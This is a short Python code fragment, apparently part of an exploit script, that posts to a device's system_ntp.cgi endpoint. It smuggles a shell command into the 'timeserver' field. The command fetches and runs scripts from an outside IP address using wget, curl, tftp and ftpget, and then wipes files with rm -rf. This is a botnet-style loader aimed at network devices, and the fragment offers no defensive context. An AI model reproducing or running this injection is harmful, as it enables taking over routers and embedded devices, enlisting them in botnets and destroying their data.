                ...
                if req.status_code == 200:
                    req = self.client.post(f"{self.ip}/cgi-bin/system_ntp.cgi",
                                           data={
                                               ...
                                               "synccheck": "1",
                                               "public": "0",
                                               "timeserver": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.205/1.sh; curl -O http://196.251.72.205/1.sh; chmod 777 1.sh; sh 1.sh; tftp 196.251.72.205 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 196.251.72.205; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 196.251.72.205 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *",
                                               "interval": "60",
                                               "enableNTPServer": "1"
                                           })
